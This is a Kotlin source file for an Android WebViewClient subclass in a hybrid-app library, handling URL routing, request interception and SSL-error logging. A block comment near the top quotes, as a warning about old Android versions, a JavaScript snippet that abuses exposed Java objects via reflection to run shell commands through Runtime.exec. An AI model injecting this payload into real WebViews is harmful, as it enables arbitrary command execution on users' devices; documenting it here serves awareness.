package com.smart.library.widget.webview.client

import android.annotation.TargetApi
import android.content.ActivityNotFoundException
import android.content.Intent
import android.graphics.Bitmap
import android.net.Uri
import android.net.http.SslError
import android.os.Build
import android.os.Message
import android.util.Log
import android.webkit.*
import com.smart.library.bundle.CXHybird
import com.smart.library.util.CXLogUtil
import com.smart.library.util.hybird.CXHybirdBridge

/*

android 17 以下存在的 安全问题
function addJsHack(cmdArgs){
    for (var obj in window) {
        try {
            if ("getClass" in window[obj]) {
                try {
                    window[obj].getClass().forName("java.lang.Runtime").
                        getMethod("getRuntime", null).invoke(null, null).exec(cmdArgs);;
                } catch (e) {
                }
            }
        } catch (e) {
        }
    }
}
addJsHack("")

 */
@Suppress("unused", "OverridingDeprecatedMember", "DEPRECATION", "RedundantOverride", "UseExpressionBody")
open class CXWebViewClient : WebViewClient() {

    init {
        //每次浏览器启动
        //Log.e(CXHybirdBridge.TAG, "检测到浏览器初始化")
    }

    open fun onDestroy() {
        //Log.d(CXHybirdBridge.TAG, "每次浏览器关闭，提前删除 webView 的强引用,避免内存泄露")
        CXHybird.onWebViewClose(this)
    }

    /**
     * 如果不 重新执行 view?.loadUrl(url) 并 return true, 则对于重定向的 url 将不会调用 shouldInterceptRequest 生命周期,则无法伪造资源
     * 相关讨论-> https://groups.google.com/a/chromium.org/forum/#!topic/android-webview-dev/FzajQrxaG48
     */
    override fun shouldOverrideUrlLoading(view: WebView?, url: String?): Boolean {
        Log.d(CXHybirdBridge.TAG, "shouldOverrideUrlLoading: $url")

        if (url?.isNotBlank() == true && !CXHybirdBridge.shouldOverrideUrlLoading(view, this, url)) {
            // 处理 hybird 异步检查更新操作
            if (CXHybird.getModule(url) != null) {
                view?.loadUrl(url)
                return true
            }

            // 处理 第三方 schema 的跳转, like youku:// and so on
            if (!url.startsWith("http")) {
                try {
                    view?.context?.startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(url)))
                    return true
                } catch (ignore: ActivityNotFoundException) {
                }
            }
        }
        return false
    }

    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
    override fun shouldOverrideUrlLoading(view: WebView?, request: WebResourceRequest?): Boolean {
        return shouldOverrideUrlLoading(view, request?.url?.toString())
    }

    override fun onPageStarted(view: WebView?, url: String?, favicon: Bitmap?) {
        Log.d(CXHybirdBridge.TAG, "onPageStarted: $url")
        super.onPageStarted(view, url, favicon)
    }

    override fun doUpdateVisitedHistory(view: WebView?, url: String?, isReload: Boolean) {
        //Log.d(CXHybirdBridge.TAG, "doUpdateVisitedHistory(isReload=$isReload)): $url")
        super.doUpdateVisitedHistory(view, url, isReload)
    }

    override fun onPageFinished(webView: WebView?, url: String?) {
        Log.d(CXHybirdBridge.TAG, "onPageFinished: $url")
        super.onPageFinished(webView, url)
    }

    override fun onLoadResource(view: WebView?, url: String?) {
        super.onLoadResource(view, url)
    }

    override fun onPageCommitVisible(view: WebView?, url: String?) {
        //Log.d(CXHybirdBridge.TAG, "onPageCommitVisible: $url")
        super.onPageCommitVisible(view, url)
    }

    override fun onFormResubmission(view: WebView?, dontResend: Message?, resend: Message?) {
        //Log.d(CXHybirdBridge.TAG, "onPageCommitVisible: dontResend=$dontResend , resend=$resend")
        super.onFormResubmission(view, dontResend, resend)
    }

    /**
     * android 5.0 以上 webView 再次校验 https 证书
     */
    override fun onReceivedClientCertRequest(view: WebView?, request: ClientCertRequest?) {
        Log.w(CXHybirdBridge.TAG, "onReceivedClientCertRequest: $request")
        super.onReceivedClientCertRequest(view, request)
    }

    override fun onReceivedError(view: WebView?, request: WebResourceRequest?, error: WebResourceError?) {
        Log.w(CXHybirdBridge.TAG, "onReceivedError: $error")
        super.onReceivedError(view, request, error)
    }

    override fun onReceivedSslError(view: WebView?, handler: SslErrorHandler?, error: SslError?) {
        Log.w(CXHybirdBridge.TAG, "onReceivedSslError:proceed: $error")
        //避免调用proceed忽略证书验证错误信息继续加载页面
        super.onReceivedSslError(view, handler, error)
    }

    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
    override fun shouldInterceptRequest(view: WebView?, request: WebResourceRequest?): WebResourceResponse? {
        return shouldInterceptRequest(view, request?.url?.toString())
    }

    override fun shouldInterceptRequest(view: WebView?, url: String?): WebResourceResponse? {
        //Log.d(CXHybirdBridge.TAG, "shouldInterceptRequest: $url")
        return CXHybirdBridge.shouldInterceptRequest(view, url)
            ?: super.shouldInterceptRequest(view, url)
    }
}
